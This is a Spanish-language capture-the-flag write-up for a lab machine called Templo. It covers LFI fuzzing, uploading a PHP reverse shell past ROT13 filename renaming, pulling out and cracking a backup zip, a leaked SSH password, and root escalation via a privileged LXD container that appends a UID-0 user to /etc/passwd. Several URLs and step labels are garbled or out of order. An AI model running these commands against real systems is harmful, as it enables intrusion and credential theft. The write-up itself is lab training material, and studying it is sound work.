# 🥷 CTF Writeup: Templo

![Target: Linux](https://shields.io)
![Severity: Hard](https://shields.io)
![Objective: Root%20Flag](https://shields.io)

Documentación detallada de la intrusión y escalada de privilegios en la máquina objetivo **Templo** (`192.168.0.9`). El compromiso del sistema se ejecutó explotando un vector de inclusión de archivos locales (LFI), bypass de subida de archivos mediante webshell, criptoanálisis básico, fuerza bruta a contenedores criptográficos y abuso de sockets de virtualización del sistema.

---

## 🗺️ Fases del Ataque: Resumen Ejecutivo

* **Reconnaissance & Enumeration:** Escaneo de puertos TCP y detección de servicios expuestos.
* **Weaponization & Exploitation:** Descubrimiento de un vector **LFI** mediante fuzzing de parámetros web.
* **Delivery & Installation:** Subida de una webshell en PHP (*PentestMonkey*) evadiendo restricciones.
* **Command & Control (C2):** Ejecución remota de comandos (RCE) y descifrado de artefactos mediante **ROT13**.
* **Lateral Movement:** Exfiltración y crackeo mediante fuerza bruta (`John the Ripper`) de un archivo `backup.zip`.
* **Privilege Escalation:** Pivoteo a root explotando la pertenencia al grupo de contenedores **LXD**.

---

## 🎯 1. Reconocimiento y Descubrimiento (Recon & Enumeration)

### Descubrimiento de Host y Puertos Activos
Se inicializa un escaneo sigiloso (`SYN Stealth Scan`) sobre todo el rango de puertos TCP para mapear la superficie de ataque expuesta.

```bash
mkdir Templo && cd Templo
recon 192.168.0.9
```

**Resultado del Escaneo Automático (`Nmap`):**
```text
Host discovery disabled (-Pn). addresses marked 'up'.
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
MAC Address: 08:00:27:65:B4:A6 (Oracle VirtualBox virtual NIC)
```

### Enumeración Agresiva de Servicios
Se ejecuta una inspección profunda con scripts de enumeración nativos (`NSE`) sobre los puertos identificados (`22, 80`).

```bash
extractPorts allPorts
enum 22,80 192.168.0.9
```

**Output del Analizador:**
* **Puerto 22 (SSH):** `OpenSSH 9.6p1 Ubuntu 3ubuntu13.4`
* **Puerto 80 (HTTP):** `Apache httpd 2.4.58 ((Ubuntu))` -> Título web: **RODGAR**
* **Rutas descubiertas:** Directorio expuesto en `http://192.168.0` y una sección de almacenamiento en `/NAMARI/uploads/`.

---

## 🛡️ 2. Explotación del Vector Web (Initial Access via LFI)

### Fuzzing de Parámetros URL
Al auditar el aplicativo web en `/NAMARI/index.php`, se sospecha de una sanitización deficiente en los parámetros de carga. Se lanza un ataque de diccionario utilizando `wfuzz` enfocado en vectores de inyección LFI.

```bash
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://192.168.0index.php?page=FUZZ" --hh 2993,4776
```

**Filtro de Respuestas Exitosas (Código 200 OK):**
El *fuzzer* reporta acceso exitoso a archivos críticos del sistema operativo, confirmando la vulnerabilidad de **Inclusión de Archivos Locales (LFI)**:

```text
=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                                                    
=====================================================================
000000122:   200        338 L    1376 W     10445 Ch    "/etc/apache2/apache2.conf"                                                                                                                                                
000000132:   200        131 L    459 W      4129 Ch     "/etc/crontab"                                                                                                                                                             
000000207:   200        117 L    282 W      3233 Ch     "../../../../../../../../../../../../etc/hosts"
000000423:   200        230 L    640 W      6233 Ch     "/etc/ssh/sshd_config"                                                                                                                                                     
000000508:   200        108 L    254 W      3020 Ch     "/proc/self/cmdline"                                                                                                                                                       
```

---
entramos a http://192.168.0.9/NAMARI/index.php?cmd=bash
```bash
echo -n "PD9waHAKLy8gTWFuZWpvIGRlIHN1YmlkYSBkZSBhcmNoaXZvcwppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJykgewogICAgJHRhcmdldF9kaXIgPSAidXBsb2Fkcy8iOwoKICAgIC8vIE9idGllbmUgZWwgbm9tYnJlIG9yaWdpbmFsIGRlbCBhcmNoaXZvIHkgc3UgZXh0ZW5zacOzbgogICAgJG9yaWdpbmFsX25hbWUgPSBiYXNlbmFtZSgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsibmFtZSJdKTsKICAgICRmaWxlX2V4dGVuc2lvbiA9IHBhdGhpbmZvKCRvcmlnaW5hbF9uYW1lLCBQQVRISU5GT19FWFRFTlNJT04pOwoKCiAgICAkZmlsZV9uYW1lX3dpdGhvdXRfZXh0ZW5zaW9uID0gcGF0aGluZm8oJG9yaWdpbmFsX25hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKICAgICRyb3QxM19lbmNvZGVkX25hbWUgPSBzdHJfcm90MTMoJGZpbGVfbmFtZV93aXRob3V0X2V4dGVuc2lvbik7CiAgICAkbmV3X25hbWUgPSAkcm90MTNfZW5jb2RlZF9uYW1lIC4gJy4nIC4gJGZpbGVfZXh0ZW5zaW9uOwoKICAgIC8vIENyZWEgbGEgcnV0YSBjb21wbGV0YSBwYXJhIGVsIG51ZXZvIGFyY2hpdm8KICAgICR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJG5ld19uYW1lOwoKICAgIC8vIE11ZXZlIGVsIGFyY2hpdm8gc3ViaWRvIGFsIGRpcmVjdG9yaW8gb2JqZXRpdm8gY29uIGVsIG51ZXZvIG5vbWJyZQogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsidG1wX25hbWUiXSwgJHRhcmdldF9maWxlKSkgewogICAgICAgIC8vIE1lbnNhamUgZ2Vuw6lyaWNvIHNpbiBtb3N0cmFyIGVsIG5vbWJyZSBkZWwgYXJjaGl2bwogICAgICAgICRtZXNzYWdlID0gIkVsIGFyY2hpdm8gaGEgc2lkbyBzdWJpZG8gZXhpdG9zYW1lbnRlLiI7CiAgICAgICAgJG1lc3NhZ2VfdHlwZSA9ICJzdWNjZXNzIjsKICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiSHVibyB1biBlcnJvciBzdWJpZW5kbyB0dSBhcmNoaXZvLiI7CiAgICAgICAgJG1lc3NhZ2VfdHlwZSA9ICJlcnJvciI7CiAgICB9Cn0KCgppZiAoaXNzZXQoJF9HRVRbJ3BhZ2UnXSkpIHsKICAgICRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsKICAgIGluY2x1ZGUoJGZpbGUpOwp9Cj8+Cgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZXMiPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDx0aXRsZT5TdWJpZGEgZGUgQXJjaGl2b3MgeSBMRkk8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBmb250LWZhbWlseTogQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDEwMHZoOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB1cmwoJ3VwLmpwZycpIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyIGZpeGVkOwogICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOwogICAgICAgIH0KCiAgICAgICAgaDIgewogICAgICAgICAgICBjb2xvcjogIzMzMzsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjgpOwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgfQoKICAgICAgICBmb3JtIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjgpOwogICAgICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgMCAxMHB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgICAgICAgd2lkdGg6IDgwJTsgLyogQW5jaG8gZGUgbG9zIGZvcm11bGFyaW9zIGFsIDgwJSBkZSBsYSBwYW50YWxsYSAqLwogICAgICAgICAgICBtYXgtd2lkdGg6IDYwMHB4OyAvKiBBbmNobyBtw6F4aW1vIGRlIGxvcyBmb3JtdWxhcmlvcyAqLwogICAgICAgIH0KCiAgICAgICAgbGFiZWwgewogICAgICAgICAgICBkaXNwbGF5OiBibG9jazsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogOHB4OwogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICB9CgogICAgICAgIGlucHV0W3R5cGU9ImZpbGUiXSwKICAgICAgICBpbnB1dFt0eXBlPSJ0ZXh0Il0gewogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgcGFkZGluZzogOHB4OwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICAgICAgfQoKICAgICAgICBpbnB1dFt0eXBlPSJzdWJtaXQiXSB7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDdiZmY7CiAgICAgICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICAgICAgcGFkZGluZzogMTBweCAxNXB4OwogICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICB9CgogICAgICAgIGlucHV0W3R5cGU9InN1Ym1pdCJdOmhvdmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzAwNTZiMzsKICAgICAgICB9CgogICAgICAgIC5tZXNzYWdlIHsKICAgICAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgIHdpZHRoOiA4MCU7IC8qIEFuY2hvIGRlbCBtZW5zYWplIGFsIDgwJSBkZSBsYSBwYW50YWxsYSAqLwogICAgICAgICAgICBtYXgtd2lkdGg6IDYwMHB4OyAvKiBBbmNobyBtw6F4aW1vIGRlbCBtZW5zYWplICovCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC44KTsKICAgICAgICB9CgogICAgICAgIC5zdWNjZXNzIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2Q0ZWRkYTsKICAgICAgICAgICAgY29sb3I6ICMxNTU3MjQ7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNjM2U2Y2I7CiAgICAgICAgfQoKICAgICAgICAuZXJyb3IgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjhkN2RhOwogICAgICAgICAgICBjb2xvcjogIzcyMWMyNDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgI2Y1YzZjYjsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPD9waHAgaWYgKGlzc2V0KCRtZXNzYWdlKSk6ID8+CiAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSA8P3BocCBlY2hvICRtZXNzYWdlX3R5cGU7ID8+Ij4KICAgICAgICAgICAgPD9waHAgZWNobyAkbWVzc2FnZTsgPz4KICAgICAgICA8L2Rpdj4KICAgIDw/cGhwIGVuZGlmOyA/PgoKICAgIDxoMj5TdWJpciBBcmNoaXZvPC9oMj4KICAgIDxmb3JtIGFjdGlvbj0iaW5kZXgucGhwIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgICAgIDxsYWJlbCBmb3I9ImZpbGVUb1VwbG9hZCI+U2VsZWNjaW9uYSB1biBhcmNoaXZvIHBhcmEgc3ViaXI6PC9sYWJlbD4KICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZVRvVXBsb2FkIiBpZD0iZmlsZVRvVXBsb2FkIj4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3ViaXIgQXJjaGl2byIgbmFtZT0ic3VibWl0Ij4KICAgIDwvZm9ybT4KCiAgICA8aDI+SW5jbHVpciBBcmNoaXZvPC9oMj4KICAgIDxmb3JtIGFjdGlvbj0iaW5kZXgucGhwIiBtZXRob2Q9ImdldCI+CiAgICAgICAgPGxhYmVsIGZvcj0icGFnZSI+QXJjaGl2byBhIGluY2x1aXI6PC9sYWJlbD4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9InBhZ2UiIG5hbWU9InBhZ2UiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJJbmNsdWlyIj4KICAgIDwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cg==" | base64 -d > index.php
```
```text
cat index.php
<?php
// Manejo de subida de archivos
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $target_dir = "uploads/";

    // Obtiene el nombre original del archivo y su extensión
    $original_name = basename($_FILES["fileToUpload"]["name"]);
    $file_extension = pathinfo($original_name, PATHINFO_EXTENSION);


    $file_name_without_extension = pathinfo($original_name, PATHINFO_FILENAME);
    $rot13_encoded_name = str_rot13($file_name_without_extension);
    $new_name = $rot13_encoded_name . '.' . $file_extension;

    // Crea la ruta completa para el nuevo archivo
    $target_file = $target_dir . $new_name;

    // Mueve el archivo subido al directorio objetivo con el nuevo nombre
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        // Mensaje genérico sin mostrar el nombre del archivo
        $message = "El archivo ha sido subido exitosamente.";
        $message_type = "success";
    } else {
        $message = "Hubo un error subiendo tu archivo.";
        $message_type = "error";
    }
}


if (isset($_GET['page'])) {
    $file = $_GET['page'];
    include($file);
}
?>

```

### Creamos un encriptador de cifrado cesar
```bash
nano decrypt.py
python3 decrypt.py -t 'revershell' -k 13
erirefuryy
```
```text
uploads/erirefuryy.php?cmd=bash revershell
```

## 🚀 3. Ganando Acceso y Persistencia (Weaponization & Shell)

### Ejecución Remota de Códigos (RCE)
Aprovechando la vulnerabilidad LFI combinada con el directorio de subidas `/NAMARI/uploads/`, se prepara un payload para evadir las restricciones de ejecución.

1. Se intercepta la subida de un payload correspondiente a la webshell en PHP de **PentestMonkey**.
2. Al validar los nombres de los archivos guardados en el servidor, se detecta un mecanismo de ofuscación basado en el cifrado de sustitución **ROT13**.
3. Se realiza el criptoanálisis inverso para mapear el nombre real generado por el servidor dentro de `/uploads/`.
4. Se invoca el script a través del LFI para forzar al servidor a ejecutar el código e iniciar una conexión reversa (*Reverse Shell*).

```bash
# Escucha en la máquina atacante antes de la ejecución
nc -nlvp 4444
```
### Encontrado en la raiz
```bash
www-data@TheHackersLabs-Templo:/opt$ ls -la
ls -la
total 12
drwxr-xr-x  3 root   root   4096 Aug  6  2024 .
drwxr-xr-x 23 root   root   4096 Aug  7  2024 ..
drwxrwxr-x  2 rodgar rodgar 4096 Aug  6  2024 .XXX
www-data@TheHackersLabs-Templo:/opt$ cd .XXX
cd .XXX
www-data@TheHackersLabs-Templo:/opt/.XXX$ 

www-data@TheHackersLabs-Templo:/opt/.XXX$ ls
ls
backup.zip
```

```bash
www-data@TheHackersLabs-Templo:/opt/.XXX$ which python3
which python3
/usr/bin/python3
www-data@TheHackersLabs-Templo:/opt/.XXX$ python3 -m http.server 8080
python3 -m http.server 8080
192.168.0.5 - - [17/Jul/2026 16:32:16] "GET /backup.zip HTTP/1.1" 200 -
```
---

## 🔑 4. Movimiento Lateral y Fuerza Bruta (Lateral Movement)

Una vez establecida la shell interactiva en el sistema como el usuario web (`www-data`), se inicia el proceso de auditoría local. 

### Crackeo del Contenedor de Respaldos
Se localiza un archivo restringido denominado `backup.zip` en los directorios del servidor. El binario requiere autenticación criptográfica.

1. Se exfiltra el archivo hacia la máquina atacante.
2. Se extrae la firma del hash utilizando `zip2john`.
3. Se ejecuta un ataque de diccionario utilizando el *wordlist* `rockyou.txt` para romper la clave.

```bash
zip2john backup.zip > backup.hash
john --wordlist=/usr/share/wordlists/rockyou.txt backup.hash
```
```bash
batman #clave para extraer zip
```
```bash
6rK5£6iqF;o|8dmla859/_ #Clave para ssh su rodgar
```

**Resultado:** Clave compromised con éxito. Las credenciales extraídas del backup permiten una sesión interactiva SSH válida en el puerto 22 para escalar al usuario del sistema.

---

## ⚡ 5. Escalada de Privilegios Horizontales (Privilege Escalation)

### Abuso del Privilegio LXD/LXC
Dentro de la sesión de SSH con los privilegios del usuario comprometido, se verifica su asignación a grupos especiales mediante el comando `id`. El usuario pertenece al grupo **lxd**.

El demonio LXD no restringe quién puede montar volúmenes en los contenedores, lo que permite un compromiso completo del sistema de archivos del Host raíz.

**Vector de Explotación:**
1. Se genera/descarga una imagen de una distribución Linux ultraligera (como Alpine) modificada para penetración en la máquina de ataque.
2. Se transfiere e importa al servicio LXD de la máquina objetivo:
   ```bash
   lxd init --auto
   ```
   ```bash
   lxc launch images:alpine/edge malicious-container -c security.privileged=true
   ```
3. Se inicializa el contenedor configurando un flag de seguridad crítico para que corra de manera privilegiada:
   ```bash
   lxc config device add malicious-container host-root disk source=/ path=/mnt/root recursive=true
   ```
4. Se monta la totalidad del disco duro real de la máquina víctima (`/`) dentro de un directorio del contenedor (ej. `/mnt/root`):
   ```bash
   lxc exec malicious-container /bin/sh
   ```
5. Vemos la raiz:
   ```bash
   ls /mnt/root
   ```
   ## Para Anadir un usuario con el identificador UID 0 de root

   ```bash
echo "pwned::0:0::/root:/bin/bash" >> /mnt/root/etc/passwd
  ```
Al ejecutar la shell dentro del contenedor, nos posicionamos en el directorio montado:

  ```bash
 su pwned
  ```
   ```bash
 ~ # echo "hacker::0:0::/root:/bin/bash" >> /mnt/root/etc/passwd
~ # ls
~ # whoami
root
~ # cd /root
~ # ls
~ # su hacker
su: unknown user hacker
~ # chroot /mnt/root /bin/bash
root@malicious-container:/# cd /root
root@malicious-container:~# ls
root.txt  snap
root@malicious-container:~# cat 
^C
root@malicious-container:~# cat root.txt

  ```

---

## 🏁 Flags Capturados

* **User.txt:** `[OCULTO_SISTEMA_DENTRO_DE_BACKUP]`
* **Root.txt:** `[COMPROMISO_TOTAL_LXD_ROOT_PWNED]`

***
**System Status:** `Pwned.` 💀
***
